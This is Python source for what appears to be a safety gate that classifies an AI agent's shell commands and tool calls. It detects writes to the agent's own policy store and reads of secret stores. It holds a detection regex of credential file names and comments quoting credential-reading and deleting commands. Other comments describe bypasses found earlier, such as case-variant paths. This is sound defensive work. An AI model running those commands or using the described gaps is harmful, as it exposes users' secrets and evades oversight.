    """#479: (first command, closer) of each outermost loop on the line that holds a `cd` into a store folder
    (``went``: the command of each such `cd`, in order). A loop inside another is part of it. A `for` or `select`
    loop with a `{ ..; }` body counts as one with `do ..; done` (_brace_head, #479 verify). The first command counts
    too: for `while` and `until` it is the condition's, which runs again on every pass, so a substitution in a
    `while cd ~/.exo/policies$(..)` runs in the store from the second pass (#857); a `for` header holds no `cd`."""
    spans: list[tuple[int, int]] = []
    for e, k in enumerate(cmds):
        if k.opens is None:
            continue
        lead = [w.text for w in itertools.takewhile(lambda w: not w.quoted and w.text in _OPENERS, k.words)]
        if not lead:
            continue
        if lead[-1] == "done" and _loop_word(cmds[k.opens[0]]) >= 0:
            s = k.opens[0]
        elif lead[-1] == "}" and (s := _brace_head(cmds, k.opens[0])) >= 0:
            pass
        else:
            continue
        while spans and spans[-1][0] >= s:      # an inner loop, closed before the one around it
            spans.pop()
        spans.append((s, e))
    at = [n for n, _ in went]
    return [(s, e) for s, e in spans if (i := bisect.bisect_left(at, s)) < len(at) and at[i] <= e]


def _loop_again(cmds: list[_Cmd], spans: list[tuple[int, int]], went: list[tuple[int, str]], cmd: str, depth: int,
                line: tuple, into: tuple | None, seed_of: Callable[[int], tuple | None]) -> list[Classification]:
    """#479: the parts of the second pass of each loop in ``spans`` (_loop_spans). bash runs a loop body again after
    its own `cd` into a store folder, so on a later pass every command in it runs there, those before the `cd` too.
    The line is read again in its order, with the store folder entered where each such loop starts, named by the
    loop's first `cd` into a descriptor folder when it has one (fd_cwd, #217), and the loop's commands and the
    substitutions in them are taken from that reading. bash expands a `for` or `select` word list and the
    redirections of the loop's closer once, before the first pass, so those are left out. A substitution the line
    already read in that folder is not read again (``seed_of``: the folder _classify_shell read each one in). As on
    the line, a `cd` out of the store later in the body is not followed: fails closed. ``line`` is the line's
    (subs, stdin_unknown, inherits, given) as _classify_shell has them, and ``into`` the folder it was entered in."""
    subs, stdin_unknown, inherits, given = line
    ctx: dict = {"subs": subs, "stdin_unknown": stdin_unknown, "subs_fed": inherits, "literals": {}}
    if into:
        ctx["store_cwd"] = True
        if into[1]:
            ctx["fd_cwd"] = into[1]
    starts, at = dict(spans), [n for n, _ in went]
    out: list[Classification] = []
    again: list[tuple[range, list[range], tuple]] = []    # per loop: its substitutions, those bash expands once, folder
    slot = _own_text.get() or [None]
    prev: _Cmd | None = None
    end, once = -1, False
    token = _cd_into.set(None) if into else None
    try:
        for n, k in enumerate(cmds[:spans[-1][1] + 1]):
            if n in starts:
                end, lo = starts[n], cmds[n - 1].subs_met if n else 0
                ctx["store_cwd"] = True
                i = bisect.bisect_right(at, n)
                while i < len(at) and at[i] <= end and not went[i][1]:
                    i += 1
                if i < len(at) and at[i] <= end:
                    ctx.setdefault("fd_cwd", went[i][1])
                elif (i := bisect.bisect_left(at, n)) < len(at) and at[i] == n and went[i][1] and \
                        not (i + 1 < len(at) and at[i + 1] <= end):
                    # #857: a `while`/`until` condition's own descriptor `cd` names the folder when the loop holds no
                    # other store `cd`; a body's `cd` keeps naming it, as the second pass starts where the last `cd` left
                    ctx.setdefault("fd_cwd", went[i][1])
                w = _loop_word(k)
                once = k.words[w].text in ("for", "select") and \
                    any(not x.quoted and x.text == "in" for x in k.words[w + 2:w + 3])
                closer = cmds[end]
                shut = closer.opens[1] if closer.opens else closer.subs_met     # _loop_spans: a closer has opens
                skip = ([range(lo, k.subs_met)] if once else []) + [range(shut, closer.subs_met)]
                again.append((range(lo, closer.subs_met), skip, (True, ctx.get("fd_cwd") or "")))
            late = len(ctx.get("late", ()))
            got = _read_cmd(k, prev, cmd, depth, ctx, slot)
            if n < end and not (once and n in starts):
                out += got + ctx.get("late", [])[late:]
            prev = k
    finally:
        if token is not None:
            _cd_into.reset(token)
    slot[0] = None
    for span, skip, seed in again:
        for j in span:
            if any(j in r for r in skip) or seed_of(j) == seed:
                continue
            token = _cd_into.set(seed)
            try:
                got = [_classify_sub(subs[j], depth + 1, inherits, stdin_unknown) if depth < _DEPTH else _too_deep(cmd)]
            finally:
                _cd_into.reset(token)
            out += _given_stdin(got, lambda: None, ctx) if given or isinstance(subs[j], _OutSub) else got
    return out


def _part_key(p: Classification) -> tuple:
    """What a policy reads of one part, so a loop's second pass (#479) adds only the parts the line does not have."""
    return (p.category, p.reversibility, p.exposure, p.third_party, p.cost, p.summary, p.target, p.own, p.text,
            p.title, p.text_file, tuple(p.signals), tuple(p.alt_targets), tuple(p._command_views))


def _classify_shell(cmd: str, depth: int, stdin_unknown: bool = False) -> Classification:
    # A run of stand-in lines (_Lexer._cut), also one written by hand, is one unread part, taken in one step so that no
    # number of them recurses. The lines after it end here-doc bodies, and are read as any line.
    if m := _STAND_INS.match(cmd or ""):
        rest = cmd[m.end():]
        # the rest is the same line, read the same way
        return _combine([_unread_nest(), _classify_fed(rest, depth, stdin_unknown)], cmd) if rest else _unread_nest()
    cmds, subs, func = _parse(cmd or "")
    # A $( ) inherits the stdin of the command it is in, so on a line fed a stdin the gate cannot read, or where a
    # pipe or a compound feeds a command, an ssh in it reads a stdin the gate cannot read (#316). A command's own `<`
    # is set up after its words are expanded. A >( ) body is fed what the command around it writes, and its stdin
    # is never its line's. A value declare reads again runs its $( ) the same way (_subscript_parts).
    inherits = stdin_unknown or any(k.piped_in or k.stdin_unknown or (k.fed and bool(k.heredocs or k.herestrings))
                                    for k in cmds)
    ctx: dict = {"subs": subs, "stdin_unknown": stdin_unknown, "subs_fed": inherits,
                 "literals": {}}     # the value each command assigns as written, what the next ${..@P} reads (#579)
    if into := _cd_into.get():            # a $( ) on a line that entered the store runs in it (#465)
        ctx["store_cwd"] = True
        if into[1]:
            ctx["fd_cwd"] = into[1]
    parts: list[Classification] = []
    prev: _Cmd | None = None
    slot = _own_text.get() or [None]      # classify_shell gives each line its own
    # #465: a $( ) runs where its command runs, so one in the `cd` that entered the store or before it does not run
    # there. They are the first subs_met of the line's subs, which the lexer lists in the order of the line.
    upto, at = (0, -1) if into else (-1, -1)
    went: list[tuple[int, str]] = []     # #479: (command, folder) of each `cd` or `pushd` into a store folder
    token = _cd_into.set(None) if into else None     # a line nested in this one (ssh, bash -c) has its own folder
    try:
        for n, k in enumerate(cmds):
            parts += _read_cmd(k, prev, cmd, depth, ctx, slot)
            prev = k
            if upto < 0 and ctx.get("store_cwd"):
                upto, at = k.subs_met, n
            went += [(n, d) for d in ctx.get("cd_dirs", ())[len(went):]]
    finally:
        if token is not None:
            _cd_into.reset(token)
    slot[0] = None
    # A $( ) runs where the gate no longer knows which command it is in, so on a line where one has a stdin of its
    # own, a shell inside a $( ) reads a stdin the gate cannot name (`curl .. | echo $(bash)`).
    given = bool(subs) and any(k.fed or k.piped_in or _own_stdin(k) for k in cmds)
    # #465: a $( ), backticks or <( ) after the `cd` into the store runs there, so a non-read command in it is a store
    # write, as it is unwrapped. One in a here-doc body counts as after every command on its line. One in the
    # redirections of a compound that holds the `cd` runs before the compound (`done < <(sort x)`). As for the line's
    # own commands, a subshell or a later `cd` out is not followed: fails closed.
    there = (True, ctx.get("fd_cwd") or "") if ctx.get("store_cwd") else None
    early = [range(k.opens[1], k.subs_met) for k in cmds if k.opens and k.opens[0] <= at] if there else []

    def seed_of(j: int) -> tuple | None:
        return there if there and j >= upto and not any(j in r for r in early) else None
    for j, sub in enumerate(subs):
        seed = seed_of(j)
        token = _cd_into.set(seed) if seed else None
        try:
            if sub == _ODD_WORD:          # a word that runs a value, or one bash rejects (#143, #553, #554)
                got = [_opaque("a ${..} word or $(( that runs a value the gate does not see, or that bash rejects",
                               cmd)]
            else:
                got = [_classify_sub(sub, depth + 1, inherits, stdin_unknown) if depth < _DEPTH else _too_deep(cmd)]
        finally:
            if token is not None:
                _cd_into.reset(token)
        parts += _given_stdin(got, lambda: None, ctx) if given or isinstance(sub, _OutSub) else got
    # #479: a loop that holds a `cd` into a store folder runs its commands before that `cd` there on a later pass.
    # The call's first reading only notes such a loop; its second reading (classify) adds that pass's parts.
    # A line read in a store folder already (a $( ) after the `cd`, into) read each command and $( ) there, so a second
    # pass reads nothing new unless a loop names a descriptor folder the line was not read in: it is not read again.
    if went and (again := _loop_pass.get()) is not None and (spans := _loop_spans(cmds, went)):
        if not again[0]:
            again[1] = True
        elif not into or not into[1] and any(d and any(s <= n <= e for s, e in spans) for n, d in went):
            pass2 = _loop_again(cmds, spans, went, cmd, depth, (subs, stdin_unknown, inherits, given), into, seed_of)
            keys = {_part_key(p) for q in parts for p in _each_part(q)}
            pass2 = [m for m in pass2 if any(_part_key(p) not in keys for p in _each_part(m))]   # only what is new
            parts += pass2
            again[1] = again[1] or bool(pass2)
    parts += ctx.get("late", [])
    if func:
        parts.append(_opaque("defines a shell function", cmd))
    setters = [k.own for k in cmds if _sets_state(k)] + ([None] if func else [])
    # #454: bash opens a redirection's file as the calling user, before sudo runs, so the write of `sudo echo hi >
    # /tmp/f` happens either way. Sudo makes the command's own read costly, so it outranked the write. When such a
    # part leads the line, a copy of the first sudo write with its cost leads in its place, so the line has the
    # category it has without sudo. Every other part ranks below the copy, and a part that outranks the read (an
    # unknown program) keeps the lead. The copy keeps the part it displaced, so decide() still reads the line with
    # that part leading (a rule on a gh read's repo), and its summary names both (_write_summary). The parts stay as
    # they are. No read or shell part is a third party, so that axis needs no check.
    lead, writes = _most_severe(parts), ctx.get("sudo_writes")
    if writes and lead and lead.category in ("read", "shell") and lead.exposure == "private":
        top = replace(writes[0], reversibility=lead.reversibility, displaced=lead,
                      summary=_write_summary(lead, writes[0]))
        c = combined = _combine([top, *parts], cmd)
    else:
        c = combined = _combine(parts, cmd)

    if c.category == "credentials":
        c.reversibility = max([c.reversibility] + [p.reversibility for p in parts], key=REVERSIBILITY.index)
        c = _weigh(c, combined, cmd)
    segs = [[w.text for w in k.words] for k in cmds if k.words]

    def secret(line: Classification, name: str, target: str, part: bool) -> Classification:
        """The line as a secret line on ``name``, or with ``part`` a credentials part on ``target`` beside it. Beside
        a secret line the part is a secret read (costly), and a heavier command deeper in it is beside it too (#468
        review); beside a store write it weighs as the line's own parts do, as main has it."""
        rev = max((p.reversibility for p in parts), key=REVERSIBILITY.index, default="costly")
        rev = "costly" if part and line.category == "credentials" else max(rev, "costly", key=REVERSIBILITY.index)
        if part:
            seat = _make("credentials", summary=f"shell touching {name}"[:120], target=target, command=cmd,
                         reversibility=rev, own=None, signals=["secret store"])
            line.parts = [*line.parts, _weigh(seat, combined, cmd)]
            line.signals = list(dict.fromkeys([*line.signals, "secret store"]))
            return line
        out = _make("credentials", summary=f"shell touching {name}"[:120], target=target, command=cmd, reversibility=rev)
        out.signals = line.signals + ["secret store"]
        out.parts = list(parts)
        return _weigh(out, combined, cmd)
    every: list[str] = []
    hit = _shell_credential_hit(cmd, segs, [w.raw for k in cmds for w in k.words + [t for _, t in k.redirs]], every)
    named = hit if "/" in hit or "." in hit else ""
    # #320: on a line that is already a secret line (an expansion form read as a secret in a nested line, such as an
    # ssh remote command, decides it), the secret the line names is a part beside it when it is another target, as
    # it was the line's target where nothing else read a secret
    if hit and (c.category != "credentials" or named != c.target):
        c = secret(c, hit, named, c.category == "credentials")
    # #609 follow-up: the line's target is the first store it names. Each other store it names is a credentials part
    # with that store as its target, so a `target:` deny, reserved entry or rule on any of them matches, as it does
    # when that store comes first (`cat ~/.ss?/* ~/.aws/credentials` under `target:*/.aws/*`). One weighed part
    # stands for all; the others are copies of it on their own targets (``other_store``).
    if hit:
        have = {p.target for p in _each_part(c) if p.category == "credentials"}
        others = [w for w in dict.fromkeys(every) if w not in have]
        if others:
            c = secret(c, others[0], others[0], True)
            seat = c.parts[-1]
            seat.other_store = True
            c.parts = [*c.parts, *(replace(seat, summary=f"shell touching {w}"[:120], target=w,
                                           signals=list(seat.signals), parts=[replace(q, target=w) for q in seat.parts])
                                   for w in others[1:])]
    # D-038: a relative read on a line that enters a store folder may read the store. A store write stays the line's
    # result, and the read is a credentials part beside it, so deny and reserved entries on credentials still see it
    # (#464: `tar -C ~/.exo/policies -czf - ../keys/seat`).
    # #320: the words as written are read first, so that name and its part are as above; the expansion forms and
    # `..` readings (_cd_store_read with forms) come after it, and a name they read that is another target is such a
    # part beside it: `cd ~/.exo/state && echo $(cat ../keys/seat; rm -rf x)` keeps `../keys/seat`, not the `*` of
    # the `$( )`, so a rule on that target still matches (#468). On a line that those forms make a secret line
    # (`cat ${x-.env} ../keys/seat`), the name read as written is such a part too.
    walked: list = []
    first = c.category
    found = _cd_store_read(cmds, subs, False, walked)
    more = _cd_store_read(cmds, subs, True, walked) if first != "credentials" else ""
    if found and (first != "credentials" or found != c.target):
        c = secret(c, found, found, c.category in ("store_write", "credentials"))
    if more and more != found:
        c = secret(c, more, more, c.category in ("store_write", "credentials"))
    c.command = cmd
    c._command_views = list(dict.fromkeys([
        _policy_command_view(cmd),
        *(view for part in parts for view in part._command_views),
    ]))
    # Outbound text: if several gh segments post text, keep the most severe one's text. Never for a post whose
    # body is a file: another command's heredoc is not that file, and the caller reads the file (#208). On a store
    # write, the post it outranks takes the text (#435: `mail -A <store file> a@b.c <<EOF`), and so on a secret line.
    body = next((h.body for k in cmds for h in k.heredocs), None)
    if body is not None and c.category in ("store_write", "credentials"):
        _store_post_text(c, body)
    elif not c.text and not c.text_file and c.category in OUTBOUND and body is not None and c.category != "web_post":
        c.text = body
    if setters:
        c.setters = [*c.setters, *setters]    # a new list: c may share its setters with a stored result
    return c


# --- code (execute_code, python -c, node -e ...) -------------------------------------------

_CODE_PATTERNS = [
    (re.compile(r"\b(shutil\.rmtree|os\.remove|os\.unlink|os\.rmdir|Path\([^)]*\)\.unlink|\.rmtree\()"), "delete"),
    (re.compile(r"\b(requests|httpx|session|client|aiohttp\.ClientSession\(\))\.(post|put|patch|delete)\("), "web_post"),
    (re.compile(r"\burllib\.request\.urlopen\([^)]*data="), "web_post"),
    (re.compile(r"\bsmtplib\.SMTP"), "email_send"),
    (re.compile(r"\bproviders_setup\b|/api/providers\b|\bsecret-tool\b|\bremember_secret\b"), "credentials"),
    (re.compile(r"\bstripe\.\w+\.create\("), "payment"),
]
_CODE_STRINGS = re.compile(r"(['\"])((?:(?!\1).){2,400})\1")
_CODE_LISTS = re.compile(r"\[\s*((?:(['\"])(?:(?!\2).)*\2\s*,\s*)+(['\"])(?:(?!\3).)*\3)\s*,?\s*\]")
_BENIGN = ("read", "shell", "opaque_exec", "local_write", "code", "unknown", "web_read")


def classify_code(code: str, own: str | None | EllipsisType = ...) -> Classification:
    """Code the gate cannot run: look for known calls, and read each string literal (and each list of
    string literals, as in subprocess.run([...])) as a shell command. Only results that matter count.
    The code part and each call found carry `own` as their own text (#394): by default the shell command that runs
    the code (`python3 -c '..'`), or the code itself for execute_code. A literal read as a command is only a guess
    at one, so no part of its result has own text, and no rule keyed on `command` lowers it."""
    if own is ...:
        slot = _own_text.get()
        own = slot[0] if slot is not None else code
    return _classify_code(code or "", own)


def _unowned(c: Classification, seen: dict[int, Classification]) -> Classification:
    """``c`` and the parts it was built from, without own text or setters (#394), so code with a literal stays one
    text for _one_text however the literal reads. Parts shared within ``c`` stay shared."""
    if id(c) not in seen:
        seen[id(c)] = replace(c, own=None, setters=[], parts=[_unowned(p, seen) for p in c.parts])
    return seen[id(c)]


def _classify_code(code: str, own: str | None) -> Classification:
    parts = [_make("code", summary="run code", own=own)]
    for rx, cat in _CODE_PATTERNS:
        m = rx.search(code)
        if m:
            parts.append(_make(cat, summary=f"code calls {m.group(0)[:40]}", own=own))
    texts = [m.group(2) for m in _CODE_STRINGS.finditer(code)]
    texts += [" ".join(shlex.quote(s) for _, s in re.findall(r"(['\"])((?:(?!\1).)*)\1", m.group(1)))
              for m in _CODE_LISTS.finditer(code)]
    # A `\n` or `\t` escape in a literal separates commands once the code runs; read that form too.
    texts += [t.replace("\\n", "\n").replace("\\t", "\t") for t in texts if "\\n" in t or "\\t" in t]
    views: list[str] = []
    signals = ["indirection"]
    for s in texts[:200]:
        c = classify_shell(s, depth=_DEPTH - 1)
        views += c._command_views                 # every literal feeds the veto view, benign or not
        signals += [x for x in c.signals if x == "locale translation"]
        # Any part, not only the dominant one: `./build.sh; systemctl enable x` is opaque on top (D-075).
        if any(p.category not in _BENIGN for p in _each_part(c)):
            parts.append(_unowned(c, {}))
    c = _combine(parts, code)      # `classify` stamps the tool; a nested result keeps the shell's (D-075)
    c.command = code
    c.signals = list(dict.fromkeys(c.signals + signals))
    c._command_views = list(dict.fromkeys(views))
    return c


# --- tool table ----------------------------------------------------------------------------

TOOLS: dict[str, str] = {
    **{t: "read" for t in (
        "read_file", "search_files", "web_search", "session_search", "skills_list", "skill_view",
        "vision_analyze", "video_analyze", "read_terminal", "read_window_below", "x_search", "clarify",
        "show_tip", "gui_tour", "focus_pane", "desktop_preview", "drive_preview", "feishu_doc_read",
        "setup_choose", "browser_vault_list", "todo_list", "list_dir", "grep", "glob",
        "skill", "memory_zoom", "exo_trace", "ui")},  # Exo's own read-only tools: load a skill, zoom, trace, a panel
    **{t: "local_write" for t in ("write_file", "patch", "apply_patch", "memory", "skill_manage", "apply_layout",
                                    "annotate_preview", "desktop_project", "edit_file")},
    **{t: "generate" for t in ("image_generate", "video_generate", "text_to_speech")},
    **{t: "delegate" for t in ("delegate_task", "start_chat")},
    "peers": "read", "peer_send": "peer_message",
    "jobs": "read", "job_output": "read", "job_kill": "shell",  # D-032: the bash command itself is classified as foreground bash
    **{t: "credentials" for t in ("browser_vault_fill", "browser_vault_unlock", "browser_vault_save_login",
                                    "browser_vault_enter_code")},
    **{t: "browser" for t in ("browser_cdp", "browser_exec", "browser_dialog", "computer_use")},
    "web_extract": "web_read",
    "send_message": "message_send",
    "react_to_message": "reaction",
    "cronjob_manage": "schedule",
    "process_manage": "shell",
    "close_terminal": "shell",
}

# One reading for every store and secret name below (#601): on a case-insensitive file system
# `.exO/config.json` IS `.exo/config.json`, but the checks read the spelling as written, so a case
# variant walked past on main a8a4ffbd (`cp x ~/.exO/config.json`, `echo x > ~/.KUBE/config`). Names
# match in any case: the name regexes are searched on the folded text (_fold), and the list itself is
# compiled twice (_SENSITIVE_PATH_F) because `Netlify` in it is mixed-case, which a lowered text would
# not meet. A glob's own wildcards fold only in their literal text (_fold_glob): bash matches a class
# and a literal after a wildcard case-sensitively, so `[HOME=x]*` and `*/KEYS` stay out where `.EXO/*`
# reads on. `EXO_GATE_CASE_SENSITIVE=1` reads main d800f33c's case-sensitive names, for a file system
# whose `.exO` is a different folder (tests pin both readings with it).


# Held while a check reads one spelling as main's own (#601): the ssh hop probes a case-variant store path as
# written, to keep the host beside the line's own action where only the fold made the store part (review #635).
_case_off: contextvars.ContextVar[bool] = contextvars.ContextVar("exo_gate_case_off", default=False)


def _fold(p: str) -> str:
    """``p`` as the plain name compares match it: lower-cased (#601), or as written under
    EXO_GATE_CASE_SENSITIVE=1 or while _case_off is set. The name regexes fold by their own re.IGNORECASE."""
    return p.lower() if p and not _case_off.get() and os.environ.get("EXO_GATE_CASE_SENSITIVE", "") != "1" else p


def _fold_glob(g: str) -> str:
    """A glob part as bash matches it (#601): a part with no wildcard names a folder the file system opens,
    folded; one with a wildcard is fnmatch against the entries, as written — its literals too (`ID_RSA*`,
    `[HOME=x]*`)."""
    return _fold(g) if not _GLOBBY.search(g) else g


def _fold_glob_path(p: str) -> str:
    """A glob path part by part (_fold_glob): the parts the file system opens fold, the wildcard parts do not."""
    return "/".join(_fold_glob(x) for x in p.split("/"))


def _fold_made(t: str) -> bool:
    """Whether the store or secret name ``t`` reads as one only by its letter case (#601): main's spellings, the
    checks on the text itself with the fold held off (_case_off), pass on the folded spelling and not on the one
    as written. The ssh hop keeps the host beside the line's own action then (review of #635): the fold-made part
    took the line's category, and the alt target's decision — the copy of the action on the host — with it. A name
    an expansion form made a store of folds the same way in either spelling, so this is False there and the hop
    keeps the reading both spellings share."""
    if not t:
        return False
    f = _fold(t)
    if f == t:
        return False
    token = _case_off.set(True)
    try:
        plain = _store_word(t, ancestors=True) or bool(_SENSITIVE_PATH.search(t))
        folded = _store_word(f, ancestors=True) or bool(_SENSITIVE_PATH.search(f))
    finally:
        _case_off.reset(token)
    return not plain and folded

# One list of secret stores, used by the path tools (read/write/patch) and by shell parsing.
# Segment patterns match at any depth; EXO_HOME and EXO_KEYS_FILE overrides are added by
# is_sensitive_path() because they can sit anywhere.
# The list twice (#601): as main spells it, and lower-cased for the folded reading — `Netlify` in it is
# mixed-case, which a lowered text would not meet.
_SENSITIVE_PATH_TXT = (
    r"(^|/)(\.ssh|\.gnupg|\.aws|\.config/gcloud|\.config/muse|\.netrc|\.npmrc|\.pypirc|\.env(\.[\w-]+)?|"
    r"\.?credentials(\.json)?|id_(rsa|dsa|ecdsa|ed25519)(_sk)?|[^/]+\.pem|[^/]+\.key|"
    r"\.claude(/[^/]*)*|"
    r"keys\.env|\.config/exo/keys(\.env)?|\.exo/keys|\.divan/[^/]+\.key|auth\.json|"
    r"client_secret[^/]*\.json|\.unii/[^/]+/token|[^/]*token[^/]*\.(json|txt|pickle|ya?ml)|[^/]+\.token|"
    r"\.config/gh/hosts\.yml|\.git-credentials|\.docker/config\.json|\.kube/config|"
    r"\.config/netlify/config\.json|Netlify/config\.json|\.vercel/auth\.json|"
    r"proc/[^/]+/(task/[^/]+/)?environ)(/|$)")
_SENSITIVE_PATH = re.compile(_SENSITIVE_PATH_TXT)
_SENSITIVE_PATH_F = re.compile(_SENSITIVE_PATH_TXT.lower())


def _sensitive_re() -> re.Pattern:
    """The secret-name list, folded (#601) or as main spells it (EXO_GATE_CASE_SENSITIVE=1)."""
    return _SENSITIVE_PATH_F if os.environ.get("EXO_GATE_CASE_SENSITIVE", "") != "1" else _SENSITIVE_PATH

# D-039: a run folder holds the principal credential and the TCP token beside each socket, so the folder itself
# is a secret store; what is below it keeps its own class (job output in run/jobs/ stays readable). A relative
# path counts only when it spells `.exo/run`: a bare `run` is not resolved against the gate's working folder (a
# relative `keys` is). The secrets are glob samples (_run_secrets); their names already match _SENSITIVE_PATH.
_RUN_DIR = re.compile(r"(^|/)\.exo/(principals/[^/]+/)?run$")

# Concrete examples a shell glob is tested against ("could this glob match a secret store?").
_SENSITIVE_SAMPLES = ("keys.env", ".exo/keys", ".config/exo/keys.env", ".divan/seat.key", "auth.json",
                      "google_token.json", ".unii/acct/token", "client_secret_1.json", ".hermes/p/.env",
                      ".netrc", ".env", ".npmrc", ".pypirc", ".ssh/id_rsa", ".ssh/id_ed25519", ".aws/credentials",
                      ".gnupg/pubring.kbx", "credentials.json", "server.pem",
                      ".config/gh/hosts.yml", ".git-credentials", ".docker/config.json", ".kube/config")


def _home() -> str:
    return os.environ.get("HOME") or os.path.expanduser("~")


def _exo_home() -> str:
    return os.path.expanduser(os.environ.get("EXO_HOME") or "") or os.path.join(_home(), ".exo")


_STORE_VAR = re.compile(r"\$\{(HOME|EXO_HOME|EXO_PRINCIPAL_STORE|CLAUDE_CONFIG_DIR)(?=[^}\w])")
_BRACE_EVENTS = re.compile(r"\\.|\$\{|\}|\n", re.S)


def _store_var(name: str) -> str | None:
    """A store variable as _expand_text spells it: HOME, EXO_HOME and CLAUDE_CONFIG_DIR as the gate reads them, set or
    not; EXO_PRINCIPAL_STORE only when set."""
    if name == "HOME":
        return _home()
    if name == "EXO_HOME":
        return _exo_home()
    if name == "CLAUDE_CONFIG_DIR":
        return os.path.expanduser(os.environ.get("CLAUDE_CONFIG_DIR") or os.path.join(_home(), ".claude"))
    store = os.environ.get("EXO_PRINCIPAL_STORE")
    return os.path.expanduser(store) if store else None


def _store_var_ops(text: str, unset: bool, depth: int) -> str:
    """``text`` with each `${VAR<op>word}` of a store variable spelt out (#202). `:-`, `-`, `:=` and `=` give the
    value (_store_var), or the word when ``unset`` or the variable has none; `:+` and `+` give the word, or nothing
    when ``unset``; `:?`, `?` and any other operator (`%/`, `#*/`, `:0`) give the value. The word is spelt out in turn,
    its quotes dropped, to 8 levels. A form that does not close on its line, or with no value to give, stays as is."""
    m = _STORE_VAR.search(text)
    if not m:
        return text
    closes, opened = {}, []          # where each `${` closes, in one pass: a hostile line costs linear time
    for e in _BRACE_EVENTS.finditer(text, m.start()):
        if e[0] == "${":
            opened.append(e.start())
        elif e[0] == "}" and opened:
            closes[opened.pop()] = e.start()
        elif e[0] == "\n":
            opened.clear()
    out, i = [], 0
    while m:
        j = closes.get(m.start())
        if j is not None:
            op = re.match(r":?[-=?+]", text[m.end():j])
            kind, word, rep = op[0][-1] if op else "", text[m.end() + (op.end() if op else 0):j], _store_var(m[1])
            if kind == "+" and unset:
                rep = ""
            elif kind == "+" or kind in ("-", "=") and (unset or rep is None):
                rep = _expand_text(word.replace('"', "").replace("'", ""), unset, depth + 1) if depth < 8 else None
            if rep is not None:
                out.append(text[i:m.start()] + rep)
                i = j + 1
        m = _STORE_VAR.search(text, j + 1 if j is not None else m.end())
    return "".join(out) + text[i:]


def _expand_text(text: str, unset: bool = False, depth: int = 0) -> str:
    """~, $HOME and $EXO_HOME (also ${...}, and ${EXO_HOME:-word} and the other operators, see _store_var_ops) spelled
    out; nothing else is evaluated. With ``unset``, a `${VAR:-word}` form is read as bash reads it when VAR is unset."""
    text = _store_var_ops(text, unset, depth)
    home, exo = _home(), _exo_home()
    store = os.environ.get("EXO_PRINCIPAL_STORE")
    if store:
        text = re.sub(r"\$\{?EXO_PRINCIPAL_STORE\}?", lambda m: os.path.expanduser(store), text)
    text = re.sub(r"\$\{?EXO_HOME\}?", lambda m: exo, text)
    text = re.sub(r"\$\{?HOME\}?", lambda m: home, text)
    claude_dir = os.environ.get("CLAUDE_CONFIG_DIR") or os.path.join(home, ".claude")
    text = re.sub(r"\$\{?CLAUDE_CONFIG_DIR\}?", lambda m: os.path.expanduser(claude_dir), text)
    return re.sub(r"(^|(?<=[\s'\"=:<>]))~(?=/|$|\s|['\"])", lambda m: m.group(1) + home, text)


def _dynamic_secret_paths() -> list[str]:
    paths = [os.path.join(_exo_home(), "keys")]
    kf = os.environ.get("EXO_KEYS_FILE")
    paths.append(os.path.expanduser(kf) if kf else os.path.join(_home(), ".config", "exo", "keys.env"))
    claude_dir = os.environ.get("CLAUDE_CONFIG_DIR") or os.path.join(_home(), ".claude")
    paths.append(os.path.expanduser(claude_dir))
    return paths


def _is_run_dir(path: str, real: str = "") -> bool:
    """The run folder itself (D-039), in any spelling: `$EXO_HOME/run`, `.exo/run` or a principal's `run`. An
    absolute path is also resolved as written, links before `..` (``real``, when the caller has resolved it)."""
    raw = path.replace("\\", "/")
    path = os.path.normpath(raw)
    if _RUN_DIR.search(_fold(path)):
        return True
    if not path.startswith("/"):
        return False
    try:
        cands = {c for c in (path, real or os.path.realpath(raw)) if _fold(c).endswith("/run")}
        homes = {os.path.normpath(_exo_home()), os.path.realpath(_exo_home())} if cands else set()
    except (OSError, ValueError):
        return False
    return any(re.fullmatch(re.escape(_fold(h)) + r"(/principals/[^/]+)?/run", _fold(c))
               for c in cands for h in homes)


def _run_secrets() -> list[str]:
    """The credential files a run folder can hold: the core's, and the principal key of each agent that may serve
    there, run/agent-<seat>.principal.key (`default`, $EXO_SEAT and up to 64 seats under $EXO_HOME/seats, named
    as internal_names does: filtered, then sorted, then capped, so other files there take no place; the scan reads
    at most 4,096 entries, once per classify call: every glob word and the cd check share it, #269)."""
    memo = _call_memo.get()
    if memo is not None and "run_secrets" in memo:
        return memo["run_secrets"]
    names = ["default", os.environ.get("EXO_SEAT") or ""]
    try:
        with os.scandir(os.path.join(_exo_home(), "seats")) as it:   # bounded: outside classify, once per glob word
            seats = {e.name if e.is_dir() else os.path.splitext(e.name)[0] for e in itertools.islice(it, 4096)
                     if not e.name.startswith((".", "_")) and (e.is_dir() or e.name.endswith((".toml", ".json")))}
            names += sorted(seats)[:64]
    except OSError:
        pass
    out = ["exod.principal.key", "exod.token"] + [f"agent-{n}.principal.key" for n in dict.fromkeys(names) if n]
    if memo is not None:
        memo["run_secrets"] = out
    return out


_BRACE_CAP = 1024
_BRACE_BUDGET = 4096   # words one classify call may expand in all (see _brace_cost), once for the secret-store checks
                       # and once for the Exo-store checks (#224); and the hits a repeated store spelling gives again
                       # (_shell_hits)
_BRACE_SEQ = re.compile(r"([-+]?\d+)\.\.([-+]?\d+)(?:\.\.([-+]?\d+))?|([A-Za-z])\.\.([A-Za-z])(?:\.\.([-+]?\d+))?")
_brace_left: contextvars.ContextVar[list[int] | None] = contextvars.ContextVar("exo_gate_brace_left", default=None)
_call_memo: contextvars.ContextVar[dict | None] = contextvars.ContextVar("exo_gate_call_memo", default=None)
_F = TypeVar("_F", bound=Callable[..., Any])


class _BraceLimit(Exception):
    pass


def _brace_cost(word: str) -> int:
    """What one expanded word takes from the budget: one, once more per 64 characters, four times for a glob."""
    return (1 + len(word) // 64) * (4 if re.search(r"[*?\[]", word) else 1)


def _brace_budget(fn: _F) -> _F:
    """Give ``fn`` one _BRACE_BUDGET shared by every word it brace-expands, nested calls included, and one memo
    (_call_memo) for what a call reads from disk once (_run_secrets)."""
    @functools.wraps(fn)
    def run(*a: Any, **kw: Any) -> Any:
        if _brace_left.get() is not None:
            return fn(*a, **kw)
        token, memo = _brace_left.set([_BRACE_BUDGET] * 3), _call_memo.set({})
        try:
            return fn(*a, **kw)
        finally:
            _brace_left.reset(token)
            _call_memo.reset(memo)
    return cast(_F, run)


@dataclass
class _Scope:
    """What the secret-store checks of one classify call share: the folders the tool may read from (#209), the gate's
    own folder, the dynamic stores' forms and _real's lookups. The call reads the file system as one snapshot."""
    cwds: tuple[str, ...] = ()
    tool_cwds: tuple[tuple[str, str], ...] = ()  # a shell call's own `cwd` or `workdir` (#311), as (the folder
                                                 # joined to the session's folder, the folder as the call spells it)
